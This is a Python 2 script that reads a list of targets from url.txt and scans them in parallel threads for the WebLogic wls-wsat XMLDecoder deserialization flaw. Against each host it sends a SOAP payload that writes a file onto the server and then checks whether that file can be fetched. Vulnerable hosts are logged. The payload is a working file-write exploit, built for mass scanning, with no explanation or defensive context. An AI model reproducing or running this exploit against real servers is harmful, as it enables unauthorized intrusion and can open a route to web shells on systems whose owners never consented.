# -*- coding: utf-8 -*-
"""
__author__ = 'Langziyanqin'
__QQ__ = '982722261'
              ┏┓      ┏┓
            ┏┛┻━━━┛┻┓
            ┃      ☃      ┃
            ┃  ┳┛  ┗┳  ┃
            ┃      ┻      ┃
            ┗━┓      ┏━┛
                ┃      ┗━━━┓
                ┃  神兽保佑    ┣┓
                ┃　永无BUG！   ┏┛
                ┗┓┓┏━┳┓┏┛
                  ┃┫┫  ┃┫┫
                  ┗┻┛  ┗┻┛
"""
import sys
reload(sys)
from multiprocessing.dummy import Pool as ThreadPool
sys.setdefaultencoding('utf-8')
import requests
headers = { 'Content-type': 'text/xml' }
data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/weblogic.txt</string><void method="println"><string>Weblogic_Test</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'''
def scan(ip):
    ip = ip.strip("\n")
    url_post = ip + "/wls-wsat/CoordinatorPortType11"
    url_myfile = ip + "/bea_wls_internal/weblogic.txt"
    print("Test for " + ip + ".....")
    r = requests.post(url=url_post,data=data,headers=headers)
    r2 = requests.get(url_myfile)
    if r2.status_code != 404:
        print("Weblogic Vulnerable!!!")
        with open('weblogic.txt', 'a+')as aa:
            aa.write(url_myfile + '\n')
        print("You file path is " + url_myfile)
    else:
        print("No Vulnerable!!!")
    print("=================================================")

smxc = int(input(unicode('设置扫描线程数(10-500):','utf-8').encode('gbk')))
list1 = []
url_list=list(set([i.replace("\n","") for i in open("url.txt","r").readlines()]))
pool = ThreadPool(processes=smxc)  #线程数量
result = pool.map(scan, url_list)
pool.close()
pool.join()